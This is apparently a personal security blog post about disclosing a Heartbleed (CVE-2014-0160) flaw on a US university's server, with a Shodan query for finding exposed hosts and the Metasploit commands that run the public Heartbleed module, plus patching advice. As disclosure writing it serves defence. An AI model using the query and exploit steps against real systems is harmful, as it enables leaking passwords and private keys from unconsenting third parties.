---
layout: post
title: "Heartbleed"
image: /assets/images/heartbleed.jpg
---


# Is Heartbleed CVE-2014-0160 Still A Threat? Tale of A Vulnerability Disclosure
![Image representing heartbleed.]({{ "/assets/images/heartbleed.jpg" | relative_url }})

-----
## Introduction
Heartbleed? What is Heartbleed?

Heartbleed tracked as [CVE-2014-0160](https://nvd.nist.gov/vuln/detail/cve-2014-0160), is a critical vulnerability in [OpenSSL](https://www.ssldragon.com/blog/what-is-openssl/) cryptographic software library. Threat actors can abuse this flaw to trick a victim system into providing sensitive data, such as passwords and RSA keys.

Yes, you are reading this right. This vulnerability is 10 years old. This is the story about my disclosure I made about a vulnerable instance to Heartbleed.

-----
## The Hunt Starts!

Threat actors can identify instances vulnerable to Heartbleed in several ways; In this instance, I was exploring Shodan with the following query to identify the vulnerable instance.

Please note Shodan will return instances which aren’t vulnerable, so you will need to dig into the results.
```
vuln:CVE-2014-0160
```
Current results:
![Image of heartbleed Shodan results.]({{ "/assets/images/heartbleed_shodan_results.webp" | relative_url }})
<p align="center"><em>Shodan results 20/11/24</em></p>

-----
## The Disclosure
**Please note that the impacted party operates a vulnerability disclosure program and has successfully mitigated the vulnerability before this article was published.**

The impacted party for this disclosure was a major US educational institution.

-----
Exploiting this vulnerability is simple after identifying a vulnerable instance, this is because Metasploit has a built-in exploit.
### Exploitation Steps
```bash
msfconsole

use auxiliary/scanner/ssl/openssl_heartbleed

show options

set rhost (INSERT IP HERE)

exploit
```
### The Results
![Image of a Kali terminal showing a successful exploit.]({{ "/assets/images/msf_heartbleed.webp" | relative_url }})

-----
## How to fix?
Update vulnerable OpenSSL instances to the latest versions, this will [prevent](https://docs.veracode.com/r/prevent-heartbleed) exploitation.

-----
## Conclusion
This case highlights that old vulnerabilities can still wreak havoc on organisations. The skills required to conduct this cyber-attack are relatively low, with Metasploit built-in exploit.

Thanks for your time!

